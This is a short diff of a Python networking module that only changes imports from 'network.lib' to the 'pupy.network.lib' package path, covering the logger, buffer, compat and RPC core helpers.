@@ -9,7 +9,7 @@ from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
 
-from network.lib import getLogger
+from pupy.network.lib import getLogger
 
 logger = getLogger('pss')
 
@@ -36,9 +36,9 @@ import errno
 import traceback
 import zlib
 
-from network.lib.buffer import Buffer
-from network.lib.compat import select, select_error, get_exc_errno
-from network.lib.rpc.core import SocketStream, Channel
+from pupy.network.lib.buffer import Buffer
+from pupy.network.lib.compat import select, select_error, get_exc_errno
+from pupy.network.lib.rpc.core import SocketStream, Channel
 
 import threading
 
